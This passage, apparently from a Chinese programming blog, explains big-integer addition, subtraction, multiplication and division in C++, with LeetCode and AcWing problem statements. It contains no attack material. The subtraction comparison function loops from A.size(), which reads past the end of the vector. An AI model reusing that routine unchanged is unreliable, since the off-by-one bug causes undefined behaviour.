&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">addTwoNumbers</span><span class="hljs-params">(ListNode* l1, ListNode* l2)</span> </span>&#123;<br>        ListNode* head=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">-1</span>),*pMove=head;<br>        <span class="hljs-type">int</span> t=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(l1||l2||t)<br>        &#123;<br>           <span class="hljs-keyword">if</span>(l1) t+=l1-&gt;val;<br>           <span class="hljs-keyword">if</span>(l2) t+=l2-&gt;val;<br>           pMove-&gt;next=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(t%<span class="hljs-number">10</span>);<br>           t/=<span class="hljs-number">10</span>;<br>           pMove=pMove-&gt;next;<br>            <span class="hljs-comment">/*这个很重要，因为如果用for语句的话，当l1没有时还想下找就会报错*/</span><br>           <span class="hljs-keyword">if</span>(l1) l1=l1-&gt;next;<br>           <span class="hljs-keyword">if</span>(l2) l2=l2-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> head-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="高精度减法">高精度减法</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs">给定两个正整数（不含前导 0），计算它们的差，计算结果可能为负数。<br><br>输入格式<br>共两行，每行包含一个整数。<br><br>输出格式<br>共一行，包含所求的差。<br><br>数据范围<br>1≤整数长度≤105<br>输入样例：<br>32<br>11<br>输出样例：<br>21<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp;A,vector&lt;<span class="hljs-type">int</span>&gt;&amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(A.<span class="hljs-built_in">size</span>()!=B.<span class="hljs-built_in">size</span>()) <span class="hljs-keyword">return</span> A.<span class="hljs-built_in">size</span>()&gt;B.<span class="hljs-built_in">size</span>();<span class="hljs-comment">//如果长度不一样就判断A是否长于B</span><br>    <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=A.<span class="hljs-built_in">size</span>();i&gt;=<span class="hljs-number">0</span>;i--)<span class="hljs-comment">//遍历知道找到第一个不一样的数，判断A[i]是否大于B[i]</span><br>        <span class="hljs-keyword">if</span>(A[i]!=B[i]) <span class="hljs-keyword">return</span> A[i]&gt;B[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<span class="hljs-comment">//如果循环到结束说明一样长，成真和成假都可以</span><br>&#125;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp;A,<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt;C;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,t=<span class="hljs-number">0</span>;i&lt;A.<span class="hljs-built_in">size</span>();i++)<br>    &#123;<br>        t=A[i]-t;<span class="hljs-comment">//算上是否有进位</span><br>        <span class="hljs-keyword">if</span>(i&lt;B.<span class="hljs-built_in">size</span>()) t-=B[i];<span class="hljs-comment">//如果在B的范围内就减去B[i]</span><br>        C.<span class="hljs-built_in">push_back</span>((t+<span class="hljs-number">10</span>)%<span class="hljs-number">10</span>);<span class="hljs-comment">//如果A[i]-t&gt;B[i]的话,+10取余不会有任何影响，但是如果小于的话加10取余就相当于进位</span><br>        <span class="hljs-keyword">if</span>(t&lt;<span class="hljs-number">0</span>) t=<span class="hljs-number">1</span>;<span class="hljs-comment">//判断石是否需要进位</span><br>        <span class="hljs-keyword">else</span> t=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(C.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">1</span>&amp;&amp;C.<span class="hljs-built_in">back</span>()==<span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>();<span class="hljs-comment">//消去前置零 比如003，要消去00，得出3，因为高位在后面，所以只需要判断back时候是零，如果是零的话，就pop出来</span><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string a,b;<br>    vector&lt;<span class="hljs-type">int</span>&gt; A,B;<br>    cin&gt;&gt;a&gt;&gt;b;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=a.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) A.<span class="hljs-built_in">push_back</span>(a[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<span class="hljs-comment">//别忘了传进来的是字符串，转化成数字需要减去&#x27;0&#x27;</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=b.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) B.<span class="hljs-built_in">push_back</span>(b[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">cmp</span>(A,B))<span class="hljs-comment">//进行比较是否A&gt;B，如果大于的话就正常的进行相加减，如果小于的话就转换成B-A，然后加负号</span><br>    &#123;<br>        <span class="hljs-keyword">auto</span> C=<span class="hljs-built_in">sub</span>(A,B);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=C.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) cout&lt;&lt;C[i];<span class="hljs-comment">//传入的时候是个位数开始到最高位，所以输出的时候要倒着输出</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">auto</span> C=<span class="hljs-built_in">sub</span>(B,A);<br>        cout&lt;&lt;<span class="hljs-string">&quot;-&quot;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=C.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) cout&lt;&lt;C[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>##　高精度乘法</p><h3 id="高精度x低精度">高精度X低精度</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>vector &lt;<span class="hljs-type">int</span>&gt; <span class="hljs-built_in">mul</span>(vector &lt;<span class="hljs-type">int</span>&gt; &amp; A, <span class="hljs-type">int</span> b) &#123;<br>    vector &lt;<span class="hljs-type">int</span>&gt; C;<br><br>    <span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>        t += A[i] * b;       <span class="hljs-comment">// t + A[i] * b = 7218</span><br>        C.<span class="hljs-built_in">push_back</span>(t % <span class="hljs-number">10</span>); <span class="hljs-comment">// 只取个位 8</span><br>        t /= <span class="hljs-number">10</span>;             <span class="hljs-comment">// 721 看作 进位</span><br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (t) &#123;            <span class="hljs-comment">// 处理最后剩余的 t</span><br>        C.<span class="hljs-built_in">push_back</span>(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span> &amp;&amp; C.<span class="hljs-built_in">back</span>() == <span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>();<br><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    string a;<br>    <span class="hljs-type">int</span> b;<br>    cin &gt;&gt; a &gt;&gt; b;<br><br>    vector &lt;<span class="hljs-type">int</span>&gt; A;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = a.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i --) A.<span class="hljs-built_in">push_back</span>(a[i] - <span class="hljs-string">&#x27;0&#x27;</span>);<br><br>    <span class="hljs-keyword">auto</span> C = <span class="hljs-built_in">mul</span>(A, b);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = C.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i --) &#123;<br>        cout &lt;&lt; C[i];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高精度x高精度">高精度X高精度</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;A, vector&lt;<span class="hljs-type">int</span>&gt; &amp;B)</span> </span>&#123;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">C</span><span class="hljs-params">(A.size() + B.size() + <span class="hljs-number">7</span>, <span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// 初始化为 0，C的size可以大一点</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>(); i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; B.<span class="hljs-built_in">size</span>(); j++)<br>            C[i + j] += A[i] * B[j];<br><br>    <span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; C.<span class="hljs-built_in">size</span>(); i++) &#123; <span class="hljs-comment">// i = C.size() - 1时 t 一定小于 10</span><br>        t += C[i];<br>        C[i] = t % <span class="hljs-number">10</span>;<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span> &amp;&amp; C.<span class="hljs-built_in">back</span>() == <span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>(); <span class="hljs-comment">// 必须要去前导 0，因为最高位很可能是 0</span><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    string a, b;<br>    cin &gt;&gt; a &gt;&gt; b; <span class="hljs-comment">// a = &quot;1222323&quot;, b = &quot;2323423423&quot;</span><br><br>    vector&lt;<span class="hljs-type">int</span>&gt; A, B;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = a.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        A.<span class="hljs-built_in">push_back</span>(a[i] - <span class="hljs-string">&#x27;0&#x27;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = b.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        B.<span class="hljs-built_in">push_back</span>(b[i] - <span class="hljs-string">&#x27;0&#x27;</span>);<br><br>    <span class="hljs-keyword">auto</span> C = <span class="hljs-built_in">mul</span>(A, B);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = C.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        cout &lt;&lt; C[i];<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="acwing例题">acwing例题</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">793</span> 高精度乘法<br><br>给定两个非负整数（不含前导 <span class="hljs-number">0</span>） <span class="hljs-selector-tag">A</span> 和 <span class="hljs-selector-tag">B</span>，请你计算 <span class="hljs-selector-tag">A</span>×<span class="hljs-selector-tag">B</span> 的值。<br><br>输入格式<br>共两行，第一行包含整数 <span class="hljs-selector-tag">A</span>，第二行包含整数 <span class="hljs-selector-tag">B</span>。<br><br>输出格式<br>共一行，包含 <span class="hljs-selector-tag">A</span>×<span class="hljs-selector-tag">B</span> 的值。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-selector-tag">A</span>的长度≤<span class="hljs-number">100000</span>,<br><span class="hljs-number">0</span>≤<span class="hljs-selector-tag">B</span>≤<span class="hljs-number">10000</span><br>输入样例：<br><span class="hljs-number">2</span><br><span class="hljs-number">3</span><br>输出样例：<br><span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++">高精度乘以低精度<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp;A,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-type">int</span> t=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;A.<span class="hljs-built_in">size</span>();i++)<span class="hljs-comment">//讲每一位都乘以b，然后去进位</span><br>    &#123;<br>        t+=A[i]*b;<br>        C.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<br>        t/=<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(t)<span class="hljs-comment">//如果还有进位没去完就一直取，取到结束为止</span><br>    &#123;<br>        C.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<br>        t/=<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(C.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">1</span>&amp;&amp;C.<span class="hljs-built_in">back</span>()==<span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>(); <span class="hljs-comment">//如果有前置零，要去掉前置零</span><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><span class="hljs-comment">//常规操作</span></span><br><span class="hljs-function"></span>&#123;<br>    string a;<br>    <span class="hljs-type">int</span> b;<br>    vector&lt;<span class="hljs-type">int</span>&gt; A;<br>    cin&gt;&gt;a&gt;&gt;b;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=a.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) A.<span class="hljs-built_in">push_back</span>(a[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>    <span class="hljs-keyword">auto</span> C=<span class="hljs-built_in">mul</span>(A,b);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=C.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) cout&lt;&lt;C[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="高精度除法">高精度除法</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs css">给定两个非负整数（不含前导 <span class="hljs-number">0</span>） <span class="hljs-selector-tag">A</span>，<span class="hljs-selector-tag">B</span>，请你计算 <span class="hljs-selector-tag">A</span>/<span class="hljs-selector-tag">B</span> 的商和余数。<br><br>输入格式<br>共两行，第一行包含整数 <span class="hljs-selector-tag">A</span>，第二行包含整数 <span class="hljs-selector-tag">B</span>。<br><br>输出格式<br>共两行，第一行输出所求的商，第二行输出所求余数。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-selector-tag">A</span>的长度≤<span class="hljs-number">100000</span>,<br><span class="hljs-number">1</span>≤<span class="hljs-selector-tag">B</span>≤<span class="hljs-number">10000</span>,<br><span class="hljs-selector-tag">B</span> 一定不为 <span class="hljs-number">0</span><br>输入样例：<br><span class="hljs-number">7</span><br><span class="hljs-number">2</span><br>输出样例：<br><span class="hljs-number">3</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">divide</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp;A,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span>&amp;r)</span><span class="hljs-comment">//将余数传入，利用余数来求值</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=A.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)<span class="hljs-comment">//除法就是上一位的余数*10+这一位然后再除以除数反复得到答案</span><br>    &#123;<br>        r=r*<span class="hljs-number">10</span>+A[i];<br>        C.<span class="hljs-built_in">push_back</span>(r/b);<br>        r%=b;<br>    &#125;<br>    <span class="hljs-built_in">reverse</span>(C.<span class="hljs-built_in">begin</span>(),C.<span class="hljs-built_in">end</span>());<span class="hljs-comment">//因为是正向存储，所以reverse一下</span><br>    <span class="hljs-keyword">while</span>(C.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">1</span>&amp;&amp;C.<span class="hljs-built_in">back</span>()==<span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>();<span class="hljs-comment">//删除前置零</span><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><span class="hljs-comment">//前面都一样</span></span><br><span class="hljs-function"></span>&#123;<br>    string a;<br>    <span class="hljs-type">int</span> b,r=<span class="hljs-number">0</span>;<br>    cin&gt;&gt;a&gt;&gt;b;<br>    vector&lt;<span class="hljs-type">int</span>&gt; A;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=a.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) A.<span class="hljs-built_in">push_back</span>(a[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>    <span class="hljs-keyword">auto</span> C=<span class="hljs-built_in">divide</span>(A,b,r);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=C.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) cout&lt;&lt;C[i];<br>    cout&lt;&lt;endl&lt;&lt;r&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="leetcode67题">leetcode67题</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">67</span>. 二进制求和<br>给你两个二进制字符串，返回它们的和（用二进制表示）。<br>输入为 非空 字符串且只包含数字 <span class="hljs-number">1</span> 和 <span class="hljs-number">0</span>。<br><br>示例 <span class="hljs-number">1</span>:<br>输入: <span class="hljs-selector-tag">a</span> = <span class="hljs-string">&quot;11&quot;</span>, <span class="hljs-selector-tag">b</span> = <span class="hljs-string">&quot;1&quot;</span><br>输出: <span class="hljs-string">&quot;100&quot;</span><br>示例 <span class="hljs-number">2</span>:<br>输入: <span class="hljs-selector-tag">a</span> = <span class="hljs-string">&quot;1010&quot;</span>, <span class="hljs-selector-tag">b</span> = <span class="hljs-string">&quot;1011&quot;</span><br>输出: <span class="hljs-string">&quot;10101&quot;</span><br><br>提示：<br>每个字符串仅由字符 <span class="hljs-string">&#x27;0&#x27;</span> 或 <span class="hljs-string">&#x27;1&#x27;</span> 组成。<br><span class="hljs-number">1</span> &lt;= <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.length</span>, <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.length</span> &lt;= <span class="hljs-number">10</span>^<span class="hljs-number">4</span><br>字符串如果不是 <span class="hljs-string">&quot;0&quot;</span> ，就都不含前导零。<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//高精度加法的思想</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">addBinary</span><span class="hljs-params">(string a, string b)</span> </span>&#123;<br>       vector&lt;<span 